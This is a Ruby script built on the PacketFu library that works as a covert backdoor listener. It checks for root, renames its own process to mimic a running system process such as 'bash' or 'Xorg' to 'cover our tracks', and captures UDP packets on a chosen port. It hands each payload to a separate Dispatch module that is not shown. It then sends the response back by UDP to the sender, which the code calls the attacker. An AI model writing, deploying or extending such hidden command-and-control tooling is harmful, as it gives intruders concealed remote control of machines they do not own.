#!/usr/bin/env ruby

require 'optparse'
require 'rubygems'
#require 'pcaplet'
#require '../lib/packetfu.rb'
require 'packetfu'
require 'thread'
require './dispatch.rb'

include PacketFu

# ---------------------------------------------------------
# Setup and gather options
# ---------------------------------------------------------

# Make sure we're running as root
raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0

# Parse options
options = {}

optparse = OptionParser.new do |opts|
	opts.on('-h', '--help', "Command Help") do
		puts opts
		exit
	end
	# The device to communicate on
	opts.on('-d', '--device DEVICE', "Network device to listen on. Default first network device installed on host.") do |f|
		options[:dev] = f
	end
	# Optionally sepcifiy the nameserver to query
	opts.on('-p', '--cport PORT', "Port to listen on. Default 8000.") do |f|
		options[:cport] = f
	end
	opts.on('-r', '--rport PORT', "Port to send the responses to. Default 8001") do |f|
	        options[:rport] = f
	end
end

optparse.parse!

# Listening device
dev = options[:dev]? options[:dev] : Pcap.lookupdev
# Listening port
cport = options[:cport]? options[:cport] : 8000
# Response port
rport = options[:rport]? options[:rport] : 8001

# ---------------------------------------------------------
# Cover our tracks
# ---------------------------------------------------------

# We'll choose a common process that is already running on the machine to mask this process with
# List in order of preference, as we'll choose the first one that is running on the machine. If none
# are found, the first process name will be used - list wisely.
covers = ['bash','mdworker','Xorg','kthreadd','gnome-terminal']

begin
	# Run top only once, Mac top uses -l, Linux uses -n
	top = (RUBY_PLATFORM.downcase.include?("darwin")) ? `top -l 1` : `top -n 1`;

	# If none of the processes are found running, we'll just go with the first one
	$0 = covers[0]

	# Is there a process running that we can mask ourselves with? Choose the first one we find.
	covers.each do |cover|
		if top.match cover
			# Change the process name
			$0 = cover
			break
		end
	end
rescue
	# If it fails, we'll just go with the first one
	$0 = covers[0]
end

# ---------------------------------------------------------
# Listen for attacker
# ---------------------------------------------------------

#cap = Pcap::Capture.open_live(dev)
#cap.setfilter('udp dst port ' + port.to_s)

#cap.loop do |pkt|

cap = Capture.new(:iface => dev, :start => true, :filter => 'udp dst port ' + cport.to_s)

cap.stream.each do |pkt|
	packet = Packet.parse pkt
	attacker_ip = packet.ip_saddr.to_s;
	local_ip = packet.ip_daddr.to_s;

	response = Dispatch.new packet.payload dev

	udp_pkt = UDPPacket.new
	udp_pkt.udp_src = rand(0xffff - 1024) + 1024
	udp_pkt.udp_dst = rport

	udp_pkt.ip_saddr = local_ip
	udp_pkt.ip_daddr = attacker_ip
	udp_pkt.payload = response.to_string.to_s	

	udp_pkt.recalc
	udp_pkt.to_w(dev)
end

# ---------------------------------------------------------
# Fin
# ---------------------------------------------------------
